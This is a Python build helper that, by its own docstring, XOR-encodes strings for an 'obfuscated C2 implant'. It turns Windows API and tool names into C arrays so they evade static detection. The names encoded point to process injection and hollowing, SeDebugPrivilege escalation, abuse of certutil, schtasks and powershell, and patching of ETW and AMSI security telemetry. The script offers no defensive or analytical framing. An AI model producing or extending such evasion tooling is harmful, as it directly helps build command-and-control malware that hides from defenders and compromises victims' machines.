#!/usr/bin/env python3
"""
Encode strings for obfuscated C2 implant.
New XOR key: 0xA5
"""

XOR_KEY = 0xA5

def encode_string(s):
    """Encode a string with XOR key 0xA5"""
    return [ord(c) ^ XOR_KEY for c in s]

def format_array(name, values):
    """Format as C static array"""
    lines = [f"/* \"{name}\" */"]
    if len(values) <= 12:
        hex_vals = ", ".join(f"0x{v:02X}" for v in values)
        lines.append(f"static unsigned char enc_{name}[] = {{{hex_vals}}};")
    else:
        lines.append(f"static unsigned char enc_{name}[] = {{")
        chunks = [values[i:i+8] for i in range(0, len(values), 8)]
        for chunk in chunks:
            hex_vals = ", ".join(f"0x{v:02X}" for v in chunk)
            lines.append(f"    {hex_vals},")
        lines[-1] = lines[-1].rstrip(",")
        lines.append("};")
    return "\n".join(lines)

# All strings from obf.c
strings_obf = {
    "ntdll": "ntdll.dll",
    "unmap": "NtUnmapViewOfSection",
    "setinfo": "NtSetInformationProcess",
    "queryinfo": "NtQueryInformationProcess",
    "sedebug": "SeDebugPrivilege",
    "kernel32": "kernel32.dll",
    "valloc": "VirtualAllocEx",
    "writemem": "WriteProcessMemory",
    "createthread": "CreateRemoteThread",
    "openproc": "OpenProcess",
    "icacls": "icacls",
    "certutil": "certutil",
    "schtasks": "schtasks",
    "ps": "powershell",
    "winexec": "WinExec",
    "loadlib": "LoadLibraryA",
    "getproc": "GetProcAddress",
    "getmod": "GetModuleHandleA",
    "enumproc": "EnumProcessModules",
    "getbasename": "GetModuleBaseNameA",
}

# All strings from obf_etw_amsi_reflect.c
strings_etw = {
    "etweventwrite": "EtwEventWrite",
    "amsiscanbuffer": "AmsiScanBuffer",
    "amsiinit": "AmsiInitialize",
    "amsidll": "amsi.dll",
    "ntsetinfothread": "NtSetInformationThread",
}

print("=== Strings for obf.c ===")
for key, val in strings_obf.items():
    encoded = encode_string(val)
    print(format_array(key, encoded))
    print()

print("\n=== Strings for obf_etw_amsi_reflect.c ===")
for key, val in strings_etw.items():
    encoded = encode_string(val)
    print(format_array(key, encoded))
    print()
